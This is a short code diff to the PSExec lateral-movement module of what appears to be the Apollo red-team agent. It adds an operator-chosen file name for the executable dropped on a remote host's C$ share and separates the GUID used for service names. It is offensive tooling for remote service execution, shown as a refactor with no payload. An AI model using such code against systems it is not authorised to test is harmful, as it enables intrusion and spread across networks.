@@ -31,6 +31,7 @@ namespace Apollo.CommandModules.LateralMovement
         public string remote_path;
         public string service_name;
         public string display_name;
+        public string file_name;
     }
 
     internal class PSExec
@@ -42,7 +43,7 @@ namespace Apollo.CommandModules.LateralMovement
             ApolloTaskResponse resp;
             string formattedRemotePath;
             string remotePath;
-            string fileGuid = Guid.NewGuid().ToString();
+            string serviceGuid = Guid.NewGuid().ToString();
             bool bTemplateFileWritten = false;
             ServiceController resultantService = null;
 
@@ -60,23 +61,23 @@ namespace Apollo.CommandModules.LateralMovement
 
             if (string.IsNullOrEmpty(args.remote_path))
             {
-                formattedRemotePath = $"\\\\{args.computer}\\C$\\Users\\Public\\{fileGuid}.exe";
-                remotePath = $"C:\\Users\\Public\\{fileGuid}.exe";
+                formattedRemotePath = $"\\\\{args.computer}\\C$\\Users\\Public\\{args.file_name}";
+                remotePath = $"C:\\Users\\Public\\{args.file_name}";
             }
             else
             {
                 if (Directory.Exists(args.remote_path))
                 {
-                    args.remote_path = Path.Combine(args.remote_path, $"{fileGuid}.exe");
+                    args.remote_path = Path.Combine(args.remote_path, $"{args.file_name}");
                 }
                 remotePath = args.remote_path;
                 formattedRemotePath = $"\\\\{args.computer}\\{args.remote_path.Replace(':', '$')}";
             }
 
             if (string.IsNullOrEmpty(args.service_name))
-                args.service_name = $"ApolloService-{fileGuid}";
+                args.service_name = $"ApolloService-{serviceGuid}";
             if (string.IsNullOrEmpty(args.display_name))
-                args.display_name = $"Apollo Service: {fileGuid}";
+                args.display_name = $"Apollo Service: {serviceGuid}";
 
             templateFile = agent.Profile.GetFile(job.Task.id, args.template, agent.Profile.ChunkSize);
             if (templateFile.Length == null || templateFile.Length == 0)
